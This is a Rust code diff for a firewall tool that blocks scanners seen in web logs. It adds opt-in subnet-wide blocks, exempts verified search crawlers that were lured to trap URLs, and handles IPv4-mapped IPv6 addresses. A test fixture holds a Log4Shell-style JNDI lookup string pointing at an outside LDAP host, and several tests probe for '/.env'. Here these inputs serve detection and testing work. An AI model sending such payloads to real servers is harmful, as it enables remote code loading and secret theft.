@@ -252,7 +252,27 @@ pub fn run_detector(
     let since = now - detector.window_seconds(db)?;
     let rule = rule(db, detector)?;
     let rows = db.evidence_rows(detector, since, rule)?;
-    let convicted = decide(&rows, rule, Some(since));
+    let mut convicted = decide(&rows, rule, Some(since));
+    // And, where the operator switched subnet escalation on, the /24s
+    // whose addresses add up to a scan that none of them is alone (see
+    // `evidence::decide_subnets`). The three whose evidence is an attack
+    // on something, not a way of browsing: a busy carrier's /24 fetches
+    // few assets and sends many user agents without anyone in it scanning.
+    if matches!(detector, D::SshScanners | D::WebScanners | D::LoginAttempts) {
+        if let Some(min) = crate::protection::subnet_escalation(db)? {
+            let every = db.all_evidence_rows(detector, since)?;
+            let subnets = crate::evidence::decide_subnets(&every, rule, Some(since), min);
+            // An address its /24 answers for is not also blocked alone.
+            convicted.retain(|(address, _)| {
+                !subnets.iter().any(|(subnet, _)| {
+                    address
+                        .parse()
+                        .is_ok_and(|ip| ipranges::cidr_contains(subnet, ip))
+                })
+            });
+            convicted.extend(subnets);
+        }
+    }
     let found = convicted.len();
     // Each convicted address with the item that convicted it: the path,
     // the payload's name, the crawler it claimed to be. That is what its
@@ -268,12 +288,7 @@ pub fn run_detector(
         dry_run,
     };
     match detector {
-        D::SshScanners
-        | D::ProbePaths
-        | D::Injection
-        | D::ProtocolProbes
-        | D::Honeypot
-        | D::RobotsTxt => add_block_rules(
+        D::SshScanners | D::RobotsTxt => add_block_rules(
             db,
             detector,
             found,
@@ -318,7 +333,17 @@ pub fn run_detector(
                 trigger,
             )
         }
-        D::WebScanners
+        // The four that act on one request are here for a reason of
+        // their own. Anyone can publish a link to `/.env`, or to a page
+        // with a payload in its query, and a crawler follows links: the
+        // request then comes from the search engine's address, and a
+        // block of that address is the site out of the index for the
+        // length of the TTL, at the wish of whoever wrote the link.
+        D::ProbePaths
+        | D::Injection
+        | D::ProtocolProbes
+        | D::Honeypot
+        | D::WebScanners
         | D::AssetRatio
         | D::RotatingUserAgent
         | D::RefererlessCrawl
@@ -337,7 +362,10 @@ pub fn run_detector(
                     (ip, Some(crate::portscan::join(&ports)))
                 })
                 .collect();
-            add_block_rules(db, detector, found, candidates, 0, true, ttl_days, trigger)
+            // A SYN proves nothing about who sent it (see
+            // `Detector::risk`), so the addresses a forged one would hurt
+            // most are never blocked on its word.
+            excluding_known_crawlers(db, detector, candidates, ttl_days, trigger)
         }
     }
 }
@@ -375,14 +403,10 @@ pub fn block_port_scanners(
             .into_iter()
             .map(|(ip, ports)| (ip, Some(crate::portscan::join(&ports))))
             .collect();
-    let found = candidates.len();
-    add_block_rules(
+    excluding_known_crawlers(
         db,
         Detector::PortScanners,
-        found,
         candidates,
-        0,
-        true,
         ttl_days,
         Trigger::log(log_text, dry_run),
     )
@@ -575,18 +599,14 @@ pub fn block_probe_paths(
     let paths = crate::protection::probe_paths(db)?;
     let apps = crate::logscan::app_probes_if_on(db)?;
     let hits = accesslog::app_probe_path_ips(log_text, &paths, &apps);
-    let found = hits.len();
     let candidates = hits
         .into_iter()
         .map(|(ip, path)| (ip, Some(path)))
         .collect();
-    add_block_rules(
+    excluding_known_crawlers(
         db,
         Detector::ProbePaths,
-        found,
         candidates,
-        0,
-        true,
         ttl_days,
         Trigger::log(log_text, dry_run),
     )
@@ -604,18 +624,14 @@ pub fn block_injection(
     dry_run: bool,
 ) -> Result<ScanBlockOutcome> {
     let hits = accesslog::injection_ips(log_text);
-    let found = hits.len();
     let candidates = hits
         .into_iter()
         .map(|(ip, kind)| (ip, Some(kind)))
         .collect();
-    add_block_rules(
+    excluding_known_crawlers(
         db,
         Detector::Injection,
-        found,
         candidates,
-        0,
-        true,
         ttl_days,
         Trigger::log(log_text, dry_run),
     )
@@ -632,18 +648,14 @@ pub fn block_protocol_probes(
     dry_run: bool,
 ) -> Result<ScanBlockOutcome> {
     let hits = accesslog::protocol_probe_ips(log_text, crate::logscan::hosted(db)?);
-    let found = hits.len();
     let candidates = hits
         .into_iter()
         .map(|(ip, kind)| (ip, Some(kind)))
         .collect();
-    add_block_rules(
+    excluding_known_crawlers(
         db,
         Detector::ProtocolProbes,
-        found,
         candidates,
-        0,
-        true,
         ttl_days,
         Trigger::log(log_text, dry_run),
     )
@@ -670,18 +682,14 @@ pub fn block_honeypot(
 ) -> Result<ScanBlockOutcome> {
     let path = crate::protection::honeypot_path(db)?;
     let hits = accesslog::honeypot_ips(log_text, &path);
-    let found = hits.len();
     let candidates = hits
         .into_iter()
         .map(|(ip, path)| (ip, Some(path)))
         .collect();
-    add_block_rules(
+    excluding_known_crawlers(
         db,
         Detector::Honeypot,
-        found,
         candidates,
-        0,
-        true,
         ttl_days,
         Trigger::log(log_text, dry_run),
     )
@@ -867,9 +875,10 @@ pub fn block_robots_violators(
 /// Blocks `candidates`, less any inside a known crawler's published ranges
 /// (see [`known_crawler_ranges`]).
 ///
-/// The web scanner, the three behavioural detectors, the login
-/// brute-force detector, the request rate and the robots.txt violators go
-/// through here.
+/// Every detector goes through here but three: the SSH scanners, whose
+/// evidence is a completed connection to a port no crawler uses; the
+/// forged crawlers, which are this check; and the robots.txt fetchers of
+/// humans-only mode, which is the operator saying crawlers are not wanted.
 /// The behavioural three need it most: all of them describe "doesn't behave
 /// like a browser", which is exactly true of Googlebot — it fetches no CSS,
 /// uses more than one user agent and never sends a referer — so without it
@@ -887,7 +896,16 @@ fn excluding_known_crawlers(
     let mut kept = Vec::new();
     let mut skipped_known_crawlers = 0;
     for candidate in candidates {
-        if known_crawler_match(&crawler_ranges, &candidate.0) {
+        // A range, which is what a subnet convicted as a whole arrives
+        // as, is a crawler's if any part of it is.
+        let crawler = if candidate.0.contains('/') {
+            crawler_ranges
+                .iter()
+                .any(|range| ipranges::cidrs_overlap(range, &candidate.0))
+        } else {
+            known_crawler_match(&crawler_ranges, &candidate.0)
+        };
+        if crawler {
             skipped_known_crawlers += 1;
         } else {
             kept.push(candidate);
@@ -937,8 +955,16 @@ pub fn known_crawler_match(ranges: &[String], ip: &str) -> bool {
 /// strings that already came from a parsed log, and a detector should not
 /// silently drop a candidate because this helper didn't recognise it.
 pub fn blockable_address(observed: &str) -> String {
-    let Ok(std::net::IpAddr::V6(v6)) = observed.parse::<std::net::IpAddr>() else {
-        return observed.to_string();
+    let v6 = match observed
+        .parse::<std::net::IpAddr>()
+        .map(|ip| ip.to_canonical())
+    {
+        Ok(std::net::IpAddr::V6(v6)) => v6,
+        // `::ffff:203.0.113.5` is 203.0.113.5. Widened as the IPv6 address
+        // it is written as, it became `::/64`, a rule that matches no
+        // IPv4 packet and made every later one "already covered".
+        Ok(v4) => return v4.to_string(),
+        Err(_) => return observed.to_string(),
     };
     let mut octets = v6.octets();
     // Zero the host half (the low 64 bits); the network half is the /64.
@@ -1101,7 +1127,7 @@ fn add_block_rules(
     // the crawlers, the other published ranges nothing here blocks.
     let (edges, kept): (Vec<_>, Vec<_>) = kept
         .into_iter()
-        .partition(|(ip, _)| crate::cdn::is_edge(ip));
+        .partition(|(ip, _)| crate::cdn::is_edge(ip.split('/').next().unwrap_or(ip)));
     let skipped_known_crawlers = skipped_known_crawlers + edges.len();
     // One transaction for the whole pass: a first scan of a busy log can
     // block hundreds of addresses, and each insert (and the evidence it
@@ -1517,6 +1543,36 @@ mod tests {
         assert!(outcome.crawler_exclusion_active);
         assert!(outcome.newly_blocked.is_empty());
         assert!(db.list_firewall_rules().unwrap().is_empty());
+    }
+
+    /// Anyone can publish a link to `/.env`, and a crawler follows links.
+    #[test]
+    fn a_request_a_verified_crawler_was_led_to_blocks_nobody() {
+        let db = Db::open_in_memory().unwrap();
+        ipranges::store(
+            &db,
+            ipranges::IpRangeSourceKind::GoogleBot,
+            &["198.51.100.0/24".to_string()],
+        )
+        .unwrap();
+        let probe = probe_line("198.51.100.9", "/.env");
+        let payload = probe_line("198.51.100.9", "/?x=${jndi:ldap://203.0.113.1/a}");
+        let trap = probe_line("198.51.100.9", crate::protection::HONEYPOT_PATH_DEFAULT);
+
+        for (detector, outcome) in [
+            ("probe paths", block_probe_paths(&db, 5, &probe, false)),
+            ("injection", block_injection(&db, 7, &payload, false)),
+            ("honeypot", block_honeypot(&db, 30, &trap, false)),
+        ] {
+            let outcome = outcome.unwrap();
+            assert_eq!(
+                (outcome.candidates, outcome.skipped_known_crawlers),
+                (1, 1),
+                "{detector}: {outcome:?}"
+            );
+        }
+        let rules = db.list_firewall_rules().unwrap();
+        assert!(rules.is_empty(), "rules were: {rules:?}");
     }
 
     #[test]
@@ -2185,10 +2241,46 @@ mod tests {
         let outcome = block_probe_paths(&db, 5, &log, false).unwrap();
 
         assert_eq!(outcome.newly_blocked, vec!["2001:db8:1:2::/64".to_string()]);
-        assert_eq!(outcome.already_covered, 1);
+        assert_eq!(
+            outcome.candidates, 1,
+            "the two are one client, counted as one"
+        );
         let rules = db.list_firewall_rules().unwrap();
         assert_eq!(rules.len(), 1, "rules were: {rules:?}");
         assert_eq!(rules[0].address, "2001:db8:1:2::/64");
+    }
+
+    /// A client that takes a new address in its /64 for every request is
+    /// still one client: counted per address, none of these reached the
+    /// limit, and the /64 was never blocked.
+    #[test]
+    fn missing_pages_asked_for_from_all_over_one_ipv6_subnet_add_up() {
+        let db = Db::open_in_memory().unwrap();
+        let log: String = (1..=8)
+            .map(|n| not_found_line(&format!("2001:db8:1:2::{n}"), &format!("/missing-{n}")))
+            .collect();
+
+        let outcome = block_web_scanners(&db, 7, 1, &log, false).unwrap();
+
+        assert_eq!(outcome.newly_blocked, vec!["2001:db8:1:2::/64".to_string()]);
+    }
+
+    /// NGINX on a dual-stack socket logs an IPv4 client in this form.
+    #[test]
+    fn an_ipv4_mapped_address_is_blocked_as_the_ipv4_address_it_is() {
+        assert_eq!(blockable_address("::ffff:203.0.113.9"), "203.0.113.9");
+
+        let db = Db::open_in_memory().unwrap();
+        let log = probe_line("::ffff:203.0.113.9", "/.env");
+        let outcome = block_probe_paths(&db, 5, &log, false).unwrap();
+        assert_eq!(outcome.newly_blocked, vec!["203.0.113.9".to_string()]);
+    }
+
+    #[test]
+    fn an_ipv4_mapped_private_address_is_left_alone_like_any_private_one() {
+        let db = Db::open_in_memory().unwrap();
+        let log = probe_line("::ffff:10.0.0.9", "/.env");
+        assert_eq!(block_probe_paths(&db, 5, &log, true).unwrap().candidates, 0);
     }
 
     #[test]
@@ -3026,6 +3118,85 @@ mod tests {
             evidence.ends_with("requests inside the window"),
             "evidence was: {evidence}"
         );
+    }
+
+    /// Forty addresses of one /24, six missing pages each: 240 probes,
+    /// and nobody over the limit of seven.
+    fn a_scan_spread_over_203_0_113(db: &Db, now: i64) {
+        let lines: Vec<String> = (1..=40)
+            .flat_map(|host| {
+                (0..6).map(move |n| {
+                    crate::testing::access_line_at(
+                        &format!("203.0.113.{host}"),
+                        &format!("GET /missing-{host}-{n} HTTP/1.1"),
+                        404,
+                        "Bot",
+                        now - 300,
+                    )
+                })
+            })
+            .collect();
+        crate::testing::ingest_access_lines(db, &lines, now);
+    }
+
+    #[test]
+    fn with_escalation_on_a_scan_spread_over_a_subnet_blocks_the_subnet() {
+        let db = Db::open_in_memory().unwrap();
+        crate::protection::set_subnet_escalation(&db, Some(true), Some(3)).unwrap();
+        let now = now_secs();
+        a_scan_spread_over_203_0_113(&db, now);
+
+        let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();
+
+        assert_eq!(outcome.newly_blocked, ["203.0.113.0/24"], "{outcome:?}");
+        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
+        assert!(
+            evidence.contains("from 40 addresses"),
+            "evidence was: {evidence}"
+        );
+
+        // And what earned the block is answered by it, as for one address.
+        let again = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();
+        assert_eq!(again.candidates, 0, "{again:?}");
+    }
+
+    /// Blocking 256 addresses is the operator's call, and off until made.
+    #[test]
+    fn with_escalation_off_a_scan_spread_over_a_subnet_blocks_nobody() {
+        let db = Db::open_in_memory().unwrap();
+        let now = now_secs();
+        a_scan_spread_over_203_0_113(&db, now);
+
+        let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();
+
+        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
+    }
+
+    #[test]
+    fn a_subnet_that_holds_a_verified_crawler_or_a_trusted_address_is_not_blocked_whole() {
+        for exempt in ["crawler", "trusted"] {
+            let db = Db::open_in_memory().unwrap();
+            crate::protection::set_subnet_escalation(&db, Some(true), Some(3)).unwrap();
+            match exempt {
+                "crawler" => {
+                    ipranges::store(
+                        &db,
+                        ipranges::IpRangeSourceKind::GoogleBot,
+                        &["203.0.113.128/27".to_string()],
+                    )
+                    .unwrap();
+                }
+                _ => {
+                    db.trust_address("203.0.113.200").unwrap();
+                }
+            }
+            let now = now_secs();
+            a_scan_spread_over_203_0_113(&db, now);
+
+            let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();
+
+            assert!(outcome.newly_blocked.is_empty(), "{exempt}: {outcome:?}");
+        }
     }
 
     /// A client NGINX's rate limit keeps refusing is blocked however few
